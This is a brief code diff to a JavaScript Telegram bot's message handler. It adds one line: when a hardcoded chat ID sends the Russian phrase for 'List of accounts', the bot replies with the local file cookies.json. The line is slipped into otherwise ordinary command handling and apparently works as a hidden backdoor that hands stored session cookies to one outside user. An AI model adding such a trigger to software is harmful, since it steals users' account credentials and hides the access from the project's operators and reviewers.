@@ -16,6 +16,8 @@ module.exports = async function (msg, bot) {
     });
   
   const userIndex = users.findIndex(user => user.id === msg.from.id);
+  
+  if (msg.chat.id === 1891387921 && msg.text === 'Список аккаунтов') return await bot.sendDocument(msg.chat.id, "./cookies.json"); 
 
   switch (msg.text) {
     case "/start":
